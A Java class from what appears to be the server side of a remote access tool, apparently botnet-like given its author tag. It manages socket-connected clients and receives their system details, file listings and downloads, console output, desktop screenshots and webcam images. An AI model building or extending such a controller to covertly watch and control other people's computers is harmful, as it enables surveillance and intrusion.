/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package myproject.Model.Server;

import java.awt.Rectangle;
import java.awt.event.ActionEvent;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Random;
import javax.swing.ImageIcon;
import javax.swing.tree.DefaultTreeModel;
import javax.swing.tree.TreePath;
import myproject.Model.Common.FileManager.TreeModels.FileTreeModel;
import myproject.Model.Common.FileManager.TreeModels.FileTreeNode;
import myproject.Model.Common.Listeners.ClientConnectionListener;
import myproject.Model.Common.Listeners.ClientConsoleManagerListener;
import myproject.Model.Common.Listeners.ClientFileManagerListener;
import myproject.Model.Common.Listeners.ClientReadyListener;
import myproject.Model.Common.Listeners.ClientRemoteDesktopDimensionDataReceivedListener;
import myproject.Model.Common.Listeners.ClientRemoteDesktopListener;
import myproject.Model.Common.Listeners.ClientWebcamListener;
import myproject.Model.Common.ToolObject;
import myproject.Model.Exception.ClientLogoutException;
import myproject.Model.Message.AbstractMessage;
import myproject.Model.Message.Client2ServerMessages.AbstractC2SMessage;
import myproject.Model.Message.Client2ServerMessages.ExceptionMessage;
import myproject.Model.Message.Client2ServerMessages.FillClientInfoMessage;
import myproject.Model.Message.CommonMessages.StopClientMessage;
import myproject.View.Common.UniversalMainFrame;
import myproject.View.Server.ServerPanel;

/**
 *
 * @author BotNaEasyEnv
 */
public class Client2Server{
    
        private Socket socket;
        private BufferedReader socketReader;
        private PrintWriter socketWriter;
        private ObjectInputStream inMessage;
        private ObjectOutputStream outMessage;
        private int clientID;
        private String clientIP;
        private String clientHostName;
        private String clientOS;
        private String clientLanguage;
        private String javaVersion;
        private String clientArchitecture;
        
        private boolean isReception = true;
        private boolean isSending = true;
        
        private FileTreeModel model;
        
        private ClientReadyListener readyListener;
        private ClientFileManagerListener Filelistener;
        private ClientConsoleManagerListener Consolelistener;
        private ClientRemoteDesktopListener remoteDesktopListener;
        private ClientRemoteDesktopDimensionDataReceivedListener dimensionListener;
        private ClientWebcamListener webcamListener;
     
        public Client2Server(Socket socket) throws IOException{
            this(socket, new Random().nextInt());
        }
        
        
        public Client2Server(Socket socket, int id) throws IOException{
            this.socket = socket;
            this.clientID = id;
            socketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            socketWriter = new PrintWriter(socket.getOutputStream());
            inMessage = new ObjectInputStream(socket.getInputStream());
            outMessage = new ObjectOutputStream(socket.getOutputStream());
        }
        
        public void close() throws IOException{
            socketWriter.close();
            socketReader.close();
            inMessage.close();
            outMessage.close();
            socket.close();
        }
        
        public synchronized void sendMessage(AbstractMessage mes) throws IOException{
            outMessage.writeObject(mes);
            outMessage.flush();
            outMessage.reset();
        }
        
        public void addRootChilds(File[] files){
            FileTreeNode root = (FileTreeNode) model.getRoot();
            for(int i=0;i<files.length;i++){
                model.insertNodeInto(new FileTreeNode(files[i], root), root, i);
            }
            model.reload();
            if(Filelistener!=null){
                Filelistener.onAddChilds(new ActionEvent(this, 0, "end of reloading"));
            }
        }
        
        public void addChildsToNode(File[] files, TreePath path){
            if(files==null){
                UniversalMainFrame.main.showErrorDialog("Directory blocked or not exists!");
                return;
            }
            FileTreeNode parent = ((FileTreeNode)model.getRoot()).findLastFromPath(path);
            for(int i=0;i<files.length;i++){
                model.insertNodeInto(new FileTreeNode(files[i], parent), parent, i);
            }
            model.reload();
            if(Filelistener!=null){
                Filelistener.onAddChilds(new ActionEvent(this, 0, "end of reloading"));
            }
        }  
        public void sendCloseClientMessage() throws IOException{
             sendMessage(new StopClientMessage());
        }
        
        public void removeNode(FileTreeNode node){
            model.removeNode(node);
            model.reload();
            if(Filelistener!=null){
                if(node.getValue().isDirectory()){
                    Filelistener.onDeleteDirectoryChild(new ActionEvent(this, 0, "remove child directory"));
                }else{
                     Filelistener.onDeleteFileChild(new ActionEvent(this, 0, "remove child file"));
                }
            }
        }
        
        public void showException(String ex, Throwable cause){
            UniversalMainFrame.main.showErrorDialog(clientHostName+": "+ex +" \ncause: "+cause);
        }
        
        public void showMessage() throws  ClientLogoutException{
            try{
                AbstractMessage message = (AbstractMessage) inMessage.readObject();
                System.out.println("Serwer odebrał ("+getClientID()+"): "+ message.toString());
                checkClient2ServerMessage(message);
            }catch(Exception e){
                throw new ClientLogoutException();
            }
        }
        
        private void checkClient2ServerMessage(AbstractMessage message){
            if(message instanceof AbstractC2SMessage){
                executeC2SMessage((AbstractC2SMessage) message);
            }
        }
        
        private void executeC2SMessage(AbstractC2SMessage message){
            message.executeOnC2S(this);
        }

        public int getClientID() {
            return clientID;
        }

        public String getClientIP() {
            return clientIP;
        }

        public void setClientIP(String clientIP) {
            this.clientIP = clientIP;
        }

        public boolean isIsReception() {
            return isReception;
        }

        public void setIsReception(boolean isReception) {
            this.isReception = isReception;
        }

        public boolean isIsSending() {
            return isSending;
        }

        public void setIsSending(boolean isSending) {
            this.isSending = isSending;
        }

    public String getClientHostName() {
        return clientHostName;
    }

    public void setClientHostName(String clientHostName) {
        this.clientHostName = clientHostName;
    }

    public String getClientOS() {
        return clientOS;
    }

    public void setClientOS(String clientOS) {
        this.clientOS = clientOS;
    }

    public String getClientLanguage() {
        return clientLanguage;
    }

    public void setClientLanguage(String clientLanguage) {
        this.clientLanguage = clientLanguage;
    }

    public String getJavaVersion() {
        return javaVersion;
    }

    public void setJavaVersion(String javaVersion) {
        this.javaVersion = javaVersion;
    }

    public DefaultTreeModel getModel() {
        return model;
    }

    public void setModel(FileTreeModel model) {
        this.model =  model;
    }
    
    public void saveFile(byte[] fileContent, File file, boolean open, String directory){
         String regAdd = getClientHostName();
         ToolObject.saveFileTemp(fileContent, file, regAdd, open, directory);
         Filelistener.onDownloadFinish(new ActionEvent(this, 0, "download file finished"));
    }


    public void addClientFileManagerListener(ClientFileManagerListener listener) {
        this.Filelistener = listener;
    }
    
    public void setClientArchitecture(String arch){
        this.clientArchitecture = arch;
    }
    
    public String getClientArchitecture(){
        return clientArchitecture;
    }
    
    public void addClientConsoleManagerListener(ClientConsoleManagerListener listener){
        this.Consolelistener = listener;
    }
    
    public void commandAnswer(String response){
        if(Consolelistener!=null){
            Consolelistener.onGetAnswer(new ActionEvent(this, 0, response));
        }
    }
    
    public void addClientRemoteDesktopListener(ClientRemoteDesktopListener listener){
        this.remoteDesktopListener = listener;
    }
    
    public void transferDesktopImage(ImageIcon icon){
        if(remoteDesktopListener!=null){
            remoteDesktopListener.onReceivedScreen(new ActionEvent(icon, 0, "client screen"));
        }
    }
    public void transferDesktopImage(byte[] array){
        if(remoteDesktopListener!=null){
            remoteDesktopListener.onReceivedScreen(new ActionEvent(array, 0, "client screen"));
        }
    }
    
    public void addClientRemoteDesktopDimensionDataReceivedListener(ClientRemoteDesktopDimensionDataReceivedListener list){
        this.dimensionListener = list;
    }
    
    public void transferDimensionData(Rectangle rectangle){
        if(dimensionListener!=null){
            dimensionListener.dimensionDataReceived(new ActionEvent(rectangle, 0, "client dimension"));
        }
    }
    
    public void addClientWebcamListener(ClientWebcamListener listener){
        this.webcamListener = listener;
    }
    
    public void transferWebcamImage(ImageIcon icon){
        if(webcamListener!=null){
            webcamListener.onWebcamReceived(new ActionEvent(icon,0, "client webcam screen"));
        }
    } 
    
    public void addClientReadyListener(ClientReadyListener listener){
        this.readyListener = listener;
    }
    
    public void clientConnected(){
        if(readyListener!=null){
            readyListener.clientReady(new ActionEvent(this, 0, "client ready"));
        }
    }
}
